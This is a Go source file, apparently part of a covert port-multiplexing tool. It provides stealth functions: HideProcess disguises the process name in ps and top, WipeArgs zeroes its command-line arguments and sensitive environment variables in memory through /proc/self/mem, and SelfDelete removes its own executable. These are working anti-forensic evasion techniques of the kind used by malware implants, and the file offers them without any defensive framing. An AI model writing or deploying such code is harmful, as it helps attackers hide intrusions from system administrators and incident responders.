package stealth

import (
	"bytes"
	"fmt"
	"os"
	"runtime"
	"strings"
	"unsafe"

	"golang.org/x/sys/unix"
)

// HideProcess 伪装进程:
//  1. 修改 argv[0] → ps aux / /proc/pid/cmdline 显示伪装名;
//  2. prctl(PR_SET_NAME) → comm (ps -e / top / htop) 也显示伪装名。
// 注意: prctl 只影响调用线程的 comm, ps/ss 读取的是主线程 comm;
// 先 LockOSThread 把当前 goroutine 钉在主线程上, 避免迁移导致改名落空。
func HideProcess(name string) {
	runtime.LockOSThread()
	os.Args[0] = name
	b := []byte(name)
	if len(b) > 15 {
		b = b[:15]
	}
	nb := append(b, 0)
	unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(&nb[0])), 0, 0, 0)
}

// WipeArgs 把初始 argv 与敏感环境变量从进程地址空间抹零:
//   - ps aux 不再显示任何参数 (只剩空 cmdline);
//   - /proc/pid/environ 里的敏感配置 (PORTMUX_CONFIG_YAML 等) 不可见。
// 原理: 初始 argv/env 位于主线程栈区, 通过 /proc/self/mem 定位并清零。
func WipeArgs(sensitiveEnv ...string) {
	mapsData, err := os.ReadFile("/proc/self/maps")
	if err != nil {
		return
	}
	var stackStart, stackEnd uintptr
	for _, line := range strings.Split(string(mapsData), "\n") {
		if !strings.Contains(line, "[stack]") {
			continue
		}
		if _, err := fmt.Sscanf(line, "%x-%x", &stackStart, &stackEnd); err != nil {
			return
		}
		break
	}
	if stackStart == 0 || stackEnd <= stackStart || stackEnd-stackStart > 64<<20 {
		return
	}

	targets := []string{}
	// 当前 cmdline (原始 argv)
	if cmdline, err := os.ReadFile("/proc/self/cmdline"); err == nil {
		for _, s := range strings.Split(string(cmdline), "\x00") {
			if s != "" {
				targets = append(targets, s)
			}
		}
	}
	// 环境变量 (含敏感配置)
	if environ, err := os.ReadFile("/proc/self/environ"); err == nil {
		for _, s := range strings.Split(string(environ), "\x00") {
			if s != "" {
				targets = append(targets, s)
			}
		}
	}
	targets = append(targets, sensitiveEnv...)

	mem, err := os.OpenFile("/proc/self/mem", os.O_RDWR, 0)
	if err != nil {
		return
	}
	defer mem.Close()

	region := make([]byte, stackEnd-stackStart)
	if _, err := mem.ReadAt(region, int64(stackStart)); err != nil {
		return
	}
	zeros := make([]byte, 4096)
	for _, tgt := range targets {
		if tgt == "" {
			continue
		}
		b := []byte(tgt)
		if len(b) == 0 || len(b) >= len(region) {
			continue
		}
		for i := 0; i+len(b) <= len(region); i++ {
			if bytes.Equal(region[i:i+len(b)], b) {
				off := int64(stackStart) + int64(i)
				for w := 0; w < len(b); w += len(zeros) {
					n := len(b) - w
					if n > len(zeros) {
						n = len(zeros)
					}
					mem.WriteAt(zeros[:n], off+int64(w))
				}
				i += len(b) - 1
			}
		}
	}
}

func SelfDelete() {
	path, err := os.Executable()
	if err == nil {
		os.Remove(path)
	}
}
